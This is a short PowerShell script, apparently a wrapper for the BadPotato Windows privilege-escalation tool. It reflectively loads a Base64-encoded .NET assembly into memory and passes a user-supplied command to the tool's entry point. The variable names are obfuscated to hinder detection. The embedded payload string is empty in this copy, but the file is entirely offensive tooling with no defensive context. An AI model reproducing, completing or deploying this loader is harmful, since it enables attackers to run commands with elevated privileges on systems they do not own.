function Invoke-BadPotato
{

    [CmdletBinding()]
    Param (
        [String]
        $Command = "whoami"

    )
    $zzshajsuiep=""
    $unbvbx = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($zzshajsuiep))
    
    $laksopwer = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [BadPotato.ExecuteRectangle]::main($Command.Split(" "))

    [Console]::SetOut($laksopwer)
    $Results = $StringWriter.ToString()
    $Results
}
